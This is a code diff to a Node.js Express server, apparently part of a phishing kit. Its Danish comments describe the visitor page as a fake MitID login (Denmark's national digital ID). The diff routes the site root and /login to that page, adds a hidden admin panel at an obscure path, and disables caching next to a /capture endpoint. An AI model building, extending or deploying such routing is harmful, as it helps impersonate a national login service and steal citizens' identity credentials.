@@ -129,12 +129,19 @@ app.get(['/display.js', '/styles.css'], (req, res, next) => {
 });
 
 app.use('/display', express.static(path.join(__dirname, 'public'), { index: 'display.html', etag: false, lastModified: false }));
+// Admin-panelet: /admin og /admin/panel-d8x3q -> den originale admin-klon (visitor-app-mappen)
+app.get(['/admin/panel-d8x3q', '/admin/panel-d8x3q/'], (req, res) => {
+  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+  res.sendFile(path.join(__dirname, 'public', 'visitor-app', 'panel-d8x3q', 'index.html'));
+});
 // Kundesiden paa roden (/) og /login — kunden skal ikke skulle huske "/display"
 // Kundesiden: BARE domænet (ingen sti) -> visitor.html direkte.
 // /display virker stadig som alias. /login ogsaa.
-app.get(['/', '/login', '/display', '/visitor'], (req, res) => {
+// Kundesiden (visitor — den falske MitID-login): / , /login , /visitor
+// Admin-panelet (admin-klonen): /admin
+app.get(['/', '/login', '/visitor'], (req, res) => {
   res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
-  res.sendFile(path.join(__dirname, 'public', 'visitor-app', 'index.html'));
+  res.sendFile(path.join(__dirname, 'public', 'visitor', 'index.html'));
 });
 app.get(['/capture', '/capture.js'], (req, res, next) => {
     res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
@@ -147,7 +154,7 @@ app.use('/admin', (req, res, next) => {
   res.set('Expires', '0');
   next();
 });
-app.use('/admin', express.static(path.join(__dirname, 'public'), { index: 'admin.html', etag: false, lastModified: false }));
+app.use('/admin', express.static(path.join(__dirname, 'public', 'visitor-app'), { index: 'index.html', etag: false, lastModified: false }));
 app.use(express.static(path.join(__dirname, 'public'), { etag: false, lastModified: false }));
 
 // --- Public: read-only state for the display screen (no auth, no secrets in payload) ---
